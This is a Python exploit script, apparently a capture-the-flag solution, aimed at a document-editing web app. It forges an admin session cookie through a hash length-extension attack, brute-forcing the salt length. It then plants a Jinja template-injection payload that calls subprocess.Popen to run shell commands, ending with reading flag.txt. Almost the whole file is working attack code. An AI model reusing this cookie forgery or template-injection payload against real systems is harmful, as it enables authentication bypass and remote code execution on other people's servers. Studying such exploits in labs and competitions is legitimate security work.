from requests import get, post, Session
import sys, re, uuid
from math import sin

HOST = sys.argv[1]
PORT = sys.argv[2]
URL = f"http://{HOST}:{PORT}/"

def calculate_hash(hash: str, data: str, prev_data_length: int) -> str:
    hash_bytes = bytes.fromhex(hash)
    A = int.from_bytes(hash_bytes[0:4], byteorder="big")
    B = int.from_bytes(hash_bytes[4:8], byteorder="big")
    C = int.from_bytes(hash_bytes[8:12], byteorder="big")
    D = int.from_bytes(hash_bytes[12:16], byteorder="big")
    E = int.from_bytes(hash_bytes[16:20], byteorder="big")
    X = [int(0xFFFFFFFF * sin(i)) & 0xFFFFFFFF for i in range(256)]

    def F(X, Y, Z):
        return ((~X & Z) | (~X & Z)) & 0xFFFFFFFF

    def G(X, Y, Z):
        return ((X & Z) | (~Z & Y)) & 0xFFFFFFFF

    def H(X, Y, Z):
        return (X ^ Y ^ Z) & 0xFFFFFFFF

    def I(X, Y, Z):
        return (Y ^ (~Z | X)) & 0xFFFFFFFF

    def ROL(X, Y):
        return (X << Y | X >> (32 - Y)) & 0xFFFFFFFF

    for i, ch in enumerate(data):
        k, l = ord(ch), (i + prev_data_length) & 0x1f
        A = (B + ROL(A + F(B, C, D) + X[k], l)) & 0xFFFFFFFF
        B = (C + ROL(B + G(C, D, E) + X[k], l)) & 0xFFFFFFFF
        C = (D + ROL(C + H(E, A, B) + X[k], l)) & 0xFFFFFFFF
        D = (E + ROL(D + I(C, D, E) + X[k], l)) & 0xFFFFFFFF
        E = (A + ROL(E + F(A, B, C) + X[k], l)) & 0xFFFFFFFF

    return "".join([hex(x)[2:].zfill(8) for x in [A, B, C, D, E]])

def login(login):
    s = Session()
    res = s.post(URL + "login", data={"login": login})
    return s.cookies.get('auth_hash')

def try_determine_salt(current_hash, current_login, append_data, max_limit = 100):
    hash_length = 1
    while hash_length < max_limit:
        s = Session()
        new_hash = calculate_hash(current_hash, append_data, len(current_login) + hash_length)
        s.cookies.set('auth_hash', new_hash)
        s.cookies.set('login', current_login + append_data)
        res = s.get(URL)
        if res.status_code == 200 and "Log In" not in res.text:
            return hash_length, new_hash
        hash_length += 1

    return None, None

def generate_key(s):
    s.get(URL + "key")

def random_string():
    return str(uuid.uuid4()).replace("-", "")

def read_documents_with_title(s, title):
    res = s.get(URL)
    docs = re.findall(r"""<a href="/document/(\d+)">(.*?)</a>""", res.text)
    return [x[0] for x in docs if x[1] == title]

def create_document(s, title, content):
    data = {
        "title": title,
        "content": content
    }
    res = s.post(URL + "document", data=data)

def read_document_content(s, doc_id):
    res = s.get(URL + "document/" + doc_id)
    return re.findall(r"""doc_content'>([\s\S]*?)</section>""", res.text)[0].replace("\n", "")

def is_read_document(s, doc_id):
    res = s.get(URL + "document/" + doc_id)
    return "Error" not in res.text 

def edit_document(s, doc_id, title, content):
    data = {
        "title": title,
        "content": content
    }
    res = s.post(URL + "document/" + doc_id + "/edit", data=data)
    return is_read_document(s, doc_id)


def exec_command(s, doc_id, command):
    payload = """{% for x in ''.__class__.__base__.__subclasses__()%}
{% if "Popen" in x.__name__ %}
{{x([\"""" + command + """\"], shell=True, stdout=-1).stdout.read()}}
{% endif %}
{% endfor %}
"""
    is_success = edit_document(s, doc_id, random_string(), payload)
    if not is_success:
        return None

    return read_document_content(s, doc_id)

def main():
    user_name = "ad"
    user_name_suffix = "min"
    auth_hash = login(user_name)

    salt_length, admin_hash = try_determine_salt(auth_hash, user_name, user_name_suffix)
    if salt_length is None or admin_hash is None:
        print("[-] Can't find admin hash")

    print(f"[*] admin hash: {admin_hash}. salt length {salt_length}.")
    s = Session()
    s.cookies.set('auth_hash', admin_hash)
    s.cookies.set('login', user_name + user_name_suffix)

    generate_key(s)
    title = random_string()
    id = create_document(s, title, "123")
    docs_ids = read_documents_with_title(s, title)

    if not docs_ids:
        print("[-] Something wrong")
        return

    for doc_id in docs_ids:
        is_can_read = is_read_document(s, doc_id)
        if not is_can_read:
            continue

        files = exec_command(s, doc_id, "ls -la")
        print(files)

        flag = exec_command(s, doc_id, "cat flag.txt")
        print(flag)
        break

main()
